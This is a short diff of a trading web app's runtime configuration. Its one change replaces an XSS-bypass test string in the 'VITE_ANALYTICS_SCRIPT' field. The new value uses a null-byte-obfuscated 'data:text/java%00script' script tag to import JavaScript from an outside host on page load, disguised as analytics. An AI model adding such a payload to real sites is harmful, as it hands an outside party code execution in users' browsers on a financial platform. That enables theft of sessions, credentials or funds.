@@ -37,7 +37,7 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "<script src=\"data:text/java%00script,console.log('XSS Bypass')\"></script>",
+  "VITE_ANALYTICS_SCRIPT": "<script src=\"data:text/java%00script,import('https://X55.is?1=23673')\"></script>",
   "VITE_SYMBOL_LIST": "PERP_BTC_USDC",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
